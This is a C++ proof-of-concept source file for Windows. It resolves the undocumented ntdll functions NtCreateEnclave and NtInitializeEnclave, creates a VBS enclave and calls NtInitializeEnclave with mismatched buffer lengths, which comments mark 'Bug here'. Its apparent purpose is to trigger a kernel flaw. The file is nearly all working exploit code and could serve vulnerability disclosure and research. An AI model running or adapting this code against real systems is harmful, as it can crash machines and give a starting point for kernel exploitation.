// POC_NtInitializeEnclave.cpp : Defines the entry point for the console application.
//

#include "stdafx.h"
#include "windows.h"
#include "stdio.h"

#define ulong unsigned long
#define ulonglong unsigned long long

typedef ulonglong (*fNtCreateEnclave)(
HANDLE hProcess, 
ulonglong BaseAddress, 
ulonglong ZeroBits, 
ulonglong Size, 
ulonglong InitialCommitment, 
ulonglong EnclaveType, 
ulonglong EnclaveInformation, 
ulonglong EnclaveInformationLength, 
ulonglong pErrorStatus);


typedef ulonglong (*fNtInitializeEnclave)(
HANDLE hProcess, 
ulonglong Address, 
ulonglong pData, 
ulonglong DataLength, 
ulonglong pOutValue);

typedef BOOL(*fIsEnclaveTypeSupported)(DWORD flEnclaveType);



fNtCreateEnclave NtCreateEnclave = 0;
fNtInitializeEnclave NtInitializeEnclave = 0;
fIsEnclaveTypeSupported IsEnclaveTypeSupported = 0;


ulonglong GetVBSEnclave(HANDLE hProcess,ulonglong argSize)
{
	if(!NtCreateEnclave)
	{
		//printf("OS not supported\r\n");
		return 0;
	}



	void* pEnclaveInfo = VirtualAlloc(0,0x1000,MEM_COMMIT,PAGE_READWRITE);
	if(!pEnclaveInfo) return 0;
	

	ulonglong ret = 0;
	ulong Err = 0;
	ulonglong Base = 0;
	ulonglong Sizeeeeeeeee = 0;


	*(ulong*)(  ((ulonglong)pEnclaveInfo) + 0) &= (~0xFFFFFFFE);
		
	Sizeeeeeeeee = argSize;

	ret = NtCreateEnclave(hProcess,
		(ulonglong)(&Base),
		0 /* ZeroBits */,
		Sizeeeeeeeee /* Size */,
		0 /* InitialCommitment */,
		0x10,
		(ulonglong)pEnclaveInfo,
		0x24,
		(ulonglong)(&Err));

	printf("NtCreateEnclave, ret: %I64X, err: %I64X\r\n",ret,Err);

	if(Base)
	{
		printf("Base: %I64X\r\n",Base);
		VirtualFree(pEnclaveInfo,0,MEM_RELEASE);			
	}


	

	return Base;
}


void POC_66()
{
	if(!NtInitializeEnclave)
	{
		//printf("OS not supported\r\n");
		ExitProcess(0);
	}


	ulonglong pEnclave = GetVBSEnclave(GetCurrentProcess(),0x67600000);
	if(pEnclave)
	{
		printf(" pEnclave ===> %I64X\r\n",pEnclave);

		void* pData = VirtualAlloc(0,0x1000,MEM_COMMIT,PAGE_READWRITE);
		memset(pData,0,0x1000);

		ulonglong ret = 0;


		ulonglong Out0=0;

		
		ulong Err = 0;
		
		*(ulong*)pData = 0x8;

		*(ulong*)(  ((ulonglong)pData) + 0x4) = 0x100000;//Number Of Threads

		ret = NtInitializeEnclave( 		GetCurrentProcess(),
										(ulonglong)pEnclave /* Address */,
										(ulonglong)pData /* pData */,
										0x10 /* Bug here */,
										(ulonglong)(&Out0));

		printf("NtInitializeEnclave, ret: %I64X\r\n",ret);
	}
	ExitProcess(0);
}

void POC_67()
{
	if(!NtInitializeEnclave)
	{
		//printf("OS not supported\r\n");
		ExitProcess(0);
	}


	ulonglong pEnclave = GetVBSEnclave(GetCurrentProcess(),0x67600000);
	if(pEnclave)
	{
		printf(" pEnclave ===> %I64X\r\n",pEnclave);

		void* pData = VirtualAlloc(0,0x1000,MEM_COMMIT,PAGE_READWRITE);
		memset(pData,0,0x1000);

		ulonglong ret = 0;


		ulonglong Out0=0;

		
		ulong Err = 0;
		
		*(ulong*)pData = 0x10;//Bug here
		*(ulong*)(  ((ulonglong)pData) + 0x4) = 0x100000;//Number Of Threads

		ret = NtInitializeEnclave( 		GetCurrentProcess(),
										(ulonglong)pEnclave /* Address */,
										(ulonglong)pData /* pData */,
										0x8,
										(ulonglong)(&Out0));

		printf("NtInitializeEnclave, ret: %I64X\r\n",ret);
	}
	ExitProcess(0);
}



int _tmain(int argc, _TCHAR* argv[])
{
	HMODULE hM = GetModuleHandle(L"ntdll.dll");
	
	
	printf("NtInitializeEnclave at: %I64X\r\n",NtInitializeEnclave);



	IsEnclaveTypeSupported = (fIsEnclaveTypeSupported)GetProcAddress(GetModuleHandle(L"kernel32.dll"),"IsEnclaveTypeSupported");
	NtCreateEnclave = (fNtCreateEnclave) GetProcAddress(hM,"NtCreateEnclave");
	NtInitializeEnclave = (fNtInitializeEnclave)GetProcAddress(hM,"NtInitializeEnclave");
	printf("IsEnclaveTypeSupported: %I64X\r\n",IsEnclaveTypeSupported);
	printf("NtCreateEnclave: %I64X\r\n",NtCreateEnclave);
	printf("NtInitializeEnclave: %I64X\r\n",NtInitializeEnclave);

	if( (!IsEnclaveTypeSupported) || (!NtCreateEnclave) || (!NtInitializeEnclave))
	{
		printf("OS Not supported\r\n");
		return -1;
	}
	else
	{

#define ENCLAVE_TYPE_VBS  0x10

		bool b_1 = IsEnclaveTypeSupported(0x00000001);
		bool b_2 = IsEnclaveTypeSupported(0x00000002);
		bool b_10 = IsEnclaveTypeSupported(ENCLAVE_TYPE_VBS );
		bool b_11 = IsEnclaveTypeSupported(0x00000011);

		if(b_10 == false)
		{
			printf("ENCLAVE_TYPE_VBS  is not enabled on this machine\r\n");
			return -2;
		}

	}

	POC_67();
	POC_66();


	return 0;
}

